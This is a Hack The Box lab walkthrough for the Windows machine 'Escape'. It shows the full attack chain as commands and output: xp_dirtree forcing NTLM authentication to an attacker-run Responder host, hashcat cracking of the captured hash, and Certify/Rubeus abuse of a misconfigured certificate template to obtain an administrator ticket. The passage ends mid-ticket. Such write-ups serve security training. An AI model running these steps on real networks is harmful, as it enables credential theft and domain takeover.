---
title: HTB: Escape
url: https://0xdf.gitlab.io/2023/06/17/htb-escape.html
date: 2023-06-17T13:45:00+00:00
difficulty: Medium [30]
os: Windows
tags: ctf, htb-escape, hackthebox, nmap, crackmapexec, windows, smbclient, mssql, mssqlclient, xp-cmdshell, responder, net-ntlmv2, hashcat, winrm, evil-winrm, certify, adcs, rubeus, certipy, esc1, silver-ticket, pass-the-hash, xp-dirtree, htb-querier, htb-hackback, htb-proper, openssl, osep-like, oscp-like-v3
---

![Escape](/img/escape-cover.png)

Escape is a very Windows-centeric box focusing on MSSQL Server and Active Directory Certificate Services (ADCS). I’ll start by finding some MSSQL creds on an open file share. With those, I’ll use xp\_dirtree to get a Net-NTLMv2 challenge/response and crack that to get the sql\_svc password. That user has access to logs that contain the next user’s creds. To get administrator, I’ll attack active directory certificate services, showing both certify and certipy. In Beyond Root, I’ll show an alternative vector using a silver ticket attack from the first user to get file read as administrator through MSSQL.

## Box Info

| Name | [Escape](https://hackthebox.com/machines/escape)  [Escape](https://hackthebox.com/machines/escape) [Play on HackTheBox](https://hackthebox.com/machines/escape) |
| --- | --- |
| Release Date | [25 Feb 2023](https://twitter.com/hackthebox_eu/status/1628816988708429826) |
| Retire Date | 17 Jun 2023 |
| OS | Windows Windows |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Escape |
| Radar Graph | Radar chart for Escape |
| First Blood User | 00:14:14[pottm pottm](https://app.hackthebox.com/users/141036) |
| First Blood Root | 00:29:17[Embargo Embargo](https://app.hackthebox.com/users/267436) |
| Creator | [Geiseric Geiseric](https://app.hackthebox.com/users/184611) |

## Recon

### nmap

`nmap` finds a bunch of open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.202
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-14 16:42 EDT
Nmap scan report for dc.sequel.htb (10.10.11.202)
Host is up (0.092s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49668/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49708/tcp open  unknown
49712/tcp open  unknown
63474/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
oxdf@hacky$ nmap -p 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985 -sCV 10.10.11.202
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-14 16:43 EDT
Nmap scan report for dc.sequel.htb (10.10.11.202)
Host is up (0.091s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-16 01:57:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-16T02:00:13+00:00; +1d05h13m47s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-16T02:00:12+00:00; +1d05h13m47s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server  15.00.2000.00
| ms-sql-ntlm-info: 
|   Target_Name: sequel
|   NetBIOS_Domain_Name: sequel
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sequel.htb
|   DNS_Computer_Name: dc.sequel.htb
|   DNS_Tree_Name: sequel.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-06-10T04:21:47
|_Not valid after:  2053-06-10T04:21:47
|_ssl-date: 2023-06-16T02:00:13+00:00; +1d05h13m47s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-16T02:00:13+00:00; +1d05h13m47s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-06-16T02:00:12+00:00; +1d05h13m47s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/14%Time=648A2672%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1d05h13m46s, deviation: 0s, median: 1d05h13m46s
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-06-16T01:59:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.95 seconds

```

This looks very much like a Windows domain controller, based on standard Windows stuff like SMB (445), NetBIOS (135/139), LDAP (389, etc), and WinRM (5985), as well as 53 (DNS) and 88 (Kerberos) typically seen listening on DCs. There’s also a MSSQL server (1433).

The `nmap` scripts running on LDAP show the domain name of `sequel.htb`, and the TLS certificate is for `dc.sequel.htb`. I’ll add each of these, along with the hostname `dc` (Windows likes that sometimes) to my `/etc/hosts` file:

```
10.10.11.202 dc.sequel.htb sequel.htb dc

```

Finally, I note that the clock on this server is 8 hours off from my clock. I’ll need to sync this to do any Kerberos stuff.

### TLS Certificate

I’ll dive a bit deeper on the TLS certificates in use, using `openssl` to pull and format it:

```

oxdf@hacky$ openssl s_client -showcerts -connect 10.10.11.202:3269  | openssl x509 -noout -text
...[snip]...                                                
Certificate:                                                     
    Data:                                                        
        Version: 3 (0x2)                                         
        Serial Number:   
            1e:00:00:00:04:90:52:7b:fc:91:38:74:2f:00:00:00:00:00:04 
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC = htb, DC = sequel, CN = sequel-DC-CA
        Validity                                  
            Not Before: Nov 18 21:20:35 2022 GMT
            Not After : Nov 18 21:20:35 2023 GMT
        Subject: CN = dc.sequel.htb   
        Subject Public Key Info:                   
            Public Key Algorithm: rsaEncryption
...[snip]...

```

It’s interesting to note the certificate authority that issued the certificate, sequel-DC-CA.

### SMB - TCP 445

#### List

I’ll poke at the SMB shares with `crackmapexec`. Without a username and password, it fails:

```

oxdf@hacky$ crackmapexec smb 10.10.11.202 --shares
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

```

But, if I give it any username and an empty password, it works:

```

oxdf@hacky$ crackmapexec smb 10.10.11.202 -u 0xdfnotreallyausername -p '' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\0xdfnotreallyausername: 
SMB         10.10.11.202    445    DC               [+] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share 

```

#### Public

The only interesting share I can access is `Public`. I’ll connect, using `-N` for null password:

```

oxdf@hacky$ smbclient //10.10.11.202/Public -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1450035 blocks available

```

There’s a single PDF file. I’ll download it:

```

smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (102.3 KiloBytes/sec) (average 102.3 KiloBytes/sec)

```

#### SQL Server Procedures.pdf

The document is a little over a page with information about connecting to MSSQL:

[![image-20230609163617386](/img/image-20230609163617386.png)*Click for full size image*](/img/image-20230609163617386.png)

The important part is the last paragraph, which says:

> For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
> user PublicUser and password GuestUserCantWrite1 .
> Refer to the previous guidelines and make sure to switch the “Windows Authentication” to “SQL Server Authentication”.

That username / password does not work to connect over WinRM.

### MSSQL

With the creds, I can connect to the MSSQL server. I’ll use the [Impacket](https://github.com/SecureAuthCorp/impacket) tool `mssqlclient.py`:

```

oxdf@hacky$ mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
Impacket v0.10.1.dev1+20230608.100331.efc6a1c3 - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>

```

There are four databases on this server:

```

SQL (PublicUser  guest@master)> select name from master..sysdatabases;
name     
------   
master   
tempdb   
model    
msdb  

```

These are the [four default databases on MSSQL](https://dataedo.com/kb/databases/sql-server/default-databases-schemas).

### Additional Enumeration

There’s a bunch more enumeration I could do at this point:
- Check DNS for zone transfer / brute force sub-domains.
- Enumerate LDAP, with and without the creds.
- Use the creds to run Bloodhound.
- Use the creds to Kerberoast.
- Brute force usernames / passwords over Kerberos.

Given the hints so far (the domain name, the fact that the document is talking about MSSQL), I’m going to go that direction and come back to enumeration if need be.

## Shell as sql\_svc

### Fail to Run Commands

The first thing I’ll try is running commands through MSSQL server using the `xp_cmdshell` stored procedure. Unfortunately for me, it fails:

```

SQL (PublicUser  guest@master)> xp_cmdshell whoami
[-] ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.

```

I can try to enabled it (as I showed [here in Scrambled’s Alternative Roots](/2022/10/01/htb-scrambled-beyond-root.html#get-execution-via-mssql)), but this account doesn’t have permission:

```

SQL (PublicUser  guest@master)> EXECUTE sp_configure 'show advanced options', 1
[-] ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.

```

### Get Net-NTLMv2

There’s no interesting data in the database and I can’t run commands. The next thing to try is to get the SQL server to connect back to my host and authenticate, and capture a challenge / response that I can try to brute force. I showed this for [Querier](/2019/06/22/htb-querier.html#database-privesc-reporter--mssql-svc) as well as in my [Getting Creds via NTLMv2](/2019/01/13/getting-net-ntlm-hases-from-windows.html#database-access) post.

I’ll start [Responder](https://github.com/lgandx/Responder) here as root listening on a bunch of services for the `tun0` interface:

```

oxdf@hacky$ sudo python3 Responder.py -I tun0
...[snip]...
[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
...[snip]...

```

The only one I really care about here is SMB.

Now I’ll tell MSSQL to read a file on a share on my host:

```

SQL (PublicUser  guest@master)> EXEC xp_dirtree '\\10.10.14.6\share', 1, 1
subdirectory   depth   file   
------------   -----   ----  

```

It returns nothing, but at Responder there’s a “hash”:

```

[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:3eed88ec0e5a8fc1:59E6D70938C58B3C54C9472E8E56E1E2:0101000000000000806BDC6DF49AD9019120578DBC7D25E70000000002000800330035004700470001001E00570049004E002D00330041004A0036005900390054004E004F004700490004003400570049004E002D00330041
004A0036005900390054004E004F00470049002E0033003500470047002E004C004F00430041004C000300140033003500470047002E004C004F00430041004C000500140033003500470047002E004C004F00430041004C0007000800806BDC6DF49AD901060004000200000008003000300000000000000000000000003000009A3B4C1C081F6F
D07723D410BD641676C4D429F29B9CF444869989BF862B533D0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000

```

### Crack Challenge Response

I’ll use `hashcat` to crack this. The autodetect mode will find the hash type of 5600:

```

$ hashcat sql_svc_netntmlv2 /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol
...[snip]...
SQL_SVC::sequel:3eed88ec0e5a8fc1:59e6d70938c58b3c54c9472e8e56e1e2:0101000000000000806bdc6df49ad9019120578dbc7d25e70000000002000800330035004700470001001e00570049004e002d00330041004a0036005900390054004e004f004700490004003400570049004e002d00330041004a0036005900390054004e004f00470049002e0033003500470047002e004c004f00430041004c000300140033003500470047002e004c004f00430041004c000500140033003500470047002e004c004f00430041004c0007000800806bdc6df49ad901060004000200000008003000300000000000000000000000003000009a3b4c1c081f6fd07723d410bd641676c4d429f29b9cf444869989bf862b533d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0036000000000000000000:REGGIE1234ronnie
...[snip]...

```

It cracks the password to REGGIE1234ronnie in about 15 seconds on my machine.

### WinRM

With that credential, I can get a shell as sql\_svc using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

oxdf@hacky$ evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 

```

## Shell as Ryan.Cooper

### Enumeration

#### File System

The sql\_svc home directory is basically empty. Ryan.Cooper is the only other user on the host with a home directory:

```
*Evil-WinRM* PS C:\users> ls

    Directory: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc

```

In the root of the C drive, the `Public` and `SQLServer` folders are unusual:

```
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows

```

`Public` just has the `SQL Server PRocedures.pdf` file.

`SQLServer` has that installation:

```
*Evil-WinRM* PS C:\SQLServer> ls

    Directory: C:\SQLServer

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe

```

There’s a single file in the `Logs` directory:

```
*Evil-WinRM* PS C:\SQLServer\Logs> ls

    Directory: C:\SQLServer\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK

```

#### ERRORLOG.BAK

This file has logs from the SQL server:

```
*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK
2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)

2022-11-18 13:43:05.97 Server      UTC adjustment: -8:00
2022-11-18 13:43:05.97 Server      (c) Microsoft Corporation.
2022-11-18 13:43:05.97 Server      All rights reserved.
2022-11-18 13:43:05.97 Server      Server process ID is 3788.
2022-11-18 13:43:05.97 Server      System Manufacturer: 'VMware, Inc.', System Model: 'VMware7,1'.
2022-11-18 13:43:05.97 Server      Authentication mode is MIXED.
...[snip]...

```

Almost at the end of the log, there’s these messages:

```

...[snip]...
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]  
...[snip]...

```

It looks like Ryan.Cooper potentially mistyped their password, and the entered the password “NuclearMosquito3” as the username. This could happen if Ryan hit enter instead of tab while trying to log in.

### WinRM

I’ll try that username / password combination, and it works:

```

oxdf@hacky$ evil-winrm -i 10.10.11.202 -u ryan.cooper -p NuclearMosquito3

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>

```

I’ll grab `user.txt`:

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\desktop> type user.txt
358e6693************************

```

## Shell as administrator

### Enumeration

#### Identify ADCS

One thing that always needs enumeration on a Windows domain is to look for Active Directory Certificate Services (ADCS). A quick way to check for this is using `crackmapexec` (and it works as either sql\_svc or Ryan.Cooper):

```

oxdf@hacky$ crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.10.11.202    636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
ADCS                                                Found PKI Enrollment Server: dc.sequel.htb
ADCS                                                Found CN: sequel-DC-CA

```

It finds the same CA that I noticed [above](#tls-certificate).

#### Identify Vulnerable Template

With ADCS running, the next question is if there are any templates in this ADCS that are insecurely configured. To enumerate further, I’ll upload a copy of [Certify](https://github.com/GhostPack/Certify) by downloading a copy from [SharpCollection](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_Any), and uploading it to Escape:

```
*Evil-WinRM* PS C:\programdata> upload Certify.exe
Info: Uploading Certify.exe to C:\programdata\Certify.exe

Data: 236884 bytes of 236884 bytes copied

Info: Upload successful!

```

The README for Certify has walkthrough of how to enumerate and abuse certificate services. First it shows running `Certify.exe find /vulnerable`. By default, this looks across standard low privilege groups. I like to add `/currentuser` to instead look across the groups for the current user, but both are valuable depending on the scenario.

After printing some information about the Enterprise CA, it then lists a single vulnerable certificate template:

```
*Evil-WinRM* PS C:\programdata> .\Certify.exe find /vulnerable /currentuser
...[snip]...
[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT 
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519

```

The danger here is that `sequel\Domain Users` has Enrollment Rights for the certificate (this is scenario 3 in the Certify README).

### Abuse Template

#### With Certify / Rubeus

I can continue with the README scenario 3 by next running `Certify.exe` to request a certificate with an alternative name of administrator. It returns a `cert.pem`:

```
*Evil-WinRM* PS C:\programdata> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|                                    
 | |     ___ _ __| |_ _| |_ _   _                               
 | |    / _ \ '__| __| |  _| | | |                              
 | |___|  __/ |  | |_| | | | |_| |                              
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0                                                        

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAo56P0pa6nWXkj3HrM2V1c3K6V8YIsDZmPIArLsqA4M9j+iey
da4m1KrKO/aVGCJ+DISe0nl6q/7OuaQd2zyjgJJXXFqzC8/JJGqJe810LSoAyDHX
...[snip]...
dOlhVtGXsvdK//0SELfhlVAX0jzBiUhNbifCDmoakNpfGouSuNxglg==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAqifcP7M+EvDgAAAAAACjANBgkqhkiG9w0BAQsF
...[snip]...
+Aa1fv7lFabU7ksILNBuyVhfssYDSA==
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:14.0570539

```

Both the README and the end of that output show the next step. I’ll copy everything from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` into a file on my host and convert it to a `.pfx` using the command given, entering no password when prompted:

```

oxdf@hacky$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:

```

I’ll upload `cert.pfx`, as well as a copy of [Rubeus](https://github.com/GhostPack/Rubeus) (downloaded from [SharpCollection](https://github.com/Flangvik/SharpCollection)), and then run the `asktgt` command, passing it the certificate to get a TGT as administrator:

```
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx

   ______        _                                    
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)              
  | |  \ \| |_| | |_) ) ____| |_| |___ |                      
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::8d7f:f6bb:9223:b131%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBB+zJ4ljVoL7
...[snip]...

```

It works! However, Rubeus tries to load the returned ticket directly into the current session, so in theory, once I run this I could just enter administrator’s folders and get the flag. However, this doesn’t work over Evil-WinRM.

Instead, I’m going to run the same command with `/getcredentials /show /nowrap`. This will do the same thing, *and* try to dump credential information about the account:

```
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::8d7f:f6bb:9223:b131%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

    doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBFaqFRhgB+2rPRb/LTtzztAXht+gmv1Vg8FXU9emN4CLf4f4noAcnUTwyhzbIpXggub3dZA/9ninTtkrwOHLtx2UREqqwe+6996DGdD944UTlDQuxEgypx++m6TJ3hv9qPa1g9rdHhqnTlmQSAjmwaxnOs38dLRI+nUZiEeqhdPBqFx86CidDBqvBYHB9sbYvTLalkUbo02IVPi7cIa5mX7+E+GtvMBVVIYzw6GOynDj7Fg8/nEgO7CM8TCQhQ1SA3Y45E0+jM4PdJeq9LWl5UyuKF+jbzHbmYGYBpvWhZsHct/xLC+c7BS8hGB9qFaDw3n7fPDhfftKwWIs0urZmb72JIBvHtm49J4ynQDuxNULk9Zuxb17Zm4KazKQUr7E5QSziYD3Rs/56vbMONdwMraGK7AAzKZP55A/rB+zrGrfAUxVxg9MZ9iG7AzthZdbBN2jupyU6ZhPFTLz5LCySCefFWQNdKLeCsHh3fcTXILzZRVfiA4P3IUFmfAkltcWKEAoxPFh1RU5olbrlJY7v5XqvTYi/YjpTMF0GZdkEletGCrtNZm7nuql8JbXHoiDIgheBGigujxkBX6UsfZ0e2gH3Zy4yzB8QMr9+fvrrUgu1CIQbn9HWz4LaW+jOj08tlwZ0L23YQuA3SEdCOiyW1JxbfZBu7tNhgXwYSg/rlCX9g+4df4ztEhsoP+MqVE6rYjknDdrimDqlpaeny/7flAnpS/uQ7iN+SGLlUqLYIMkPeB1hHAk+fPAvOoLa4yM1tDMyMJQaKFgOfShes/ZC1i57OJoghHv0UT4OM3wNKsF/Ta09lX3nYOK3ygq7od88OtQAmpGjYAq1I4pseeFW8lH4LYzh4uuChMlz/cApmJ+PIfzLFzMPhoD10Mo88/Iu/iC6LZKi1tWYjhym5kF5p6Zjmb6GUSi11j5Sgn7Nab+jT68ncIjpVT6Z3GC9/qm8ls12c1an3dDQEKomx8WFD8TgVcyKIzODTNKyLOrVaVuwqS4WDVG3TrZZNzEUHeFc7+cRqBgIPN83cN5EiI4nYi+tdZIiwcmZ1GUW5DDijE5P8PtSvRjec0pFTjTdz/x5Y2PowaID0Mc9ij6L9TmB0xtPeC105Dra3E7VzNqT4+VbOq4LpoK62h0MjS6URlMdp+1sfQKIdL4ce6H+WIdsxc1tI